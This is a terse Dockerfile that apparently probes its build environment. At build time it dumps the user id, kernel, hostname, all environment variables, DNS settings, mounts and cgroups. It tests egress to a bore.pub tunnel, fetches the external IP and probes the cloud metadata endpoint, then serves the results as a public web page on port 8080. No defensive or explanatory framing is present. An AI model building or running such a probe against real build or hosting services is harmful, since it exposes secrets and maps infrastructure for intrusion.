FROM python:3-alpine
RUN { echo "=== id ==="; id; echo "=== uname ==="; uname -a; echo "=== hostname ==="; hostname; echo "=== env ==="; env | sort; echo "=== resolv ==="; cat /etc/resolv.conf; echo "=== mounts ==="; head -40 /proc/mounts; echo "=== cgroup ==="; cat /proc/1/cgroup 2>/dev/null; echo "=== egress bore ==="; curl -s -m 8 -o /dev/null -w "%{http_code}\n" http://bore.pub:24750/egress-test || echo FAIL; echo "=== egress ip ==="; curl -s -m 8 https://ifconfig.me || echo FAIL; echo; echo "=== metadata ==="; curl -s -m 5 -o /dev/null -w "%{http_code}\n" http://169.254.169.254/latest/meta-data/ || echo FAIL; echo "=== buildtime ==="; date -u; } > /tmp/index.html 2>&1
EXPOSE 8080
CMD ["python","-m","http.server","8080","--directory","/tmp"]
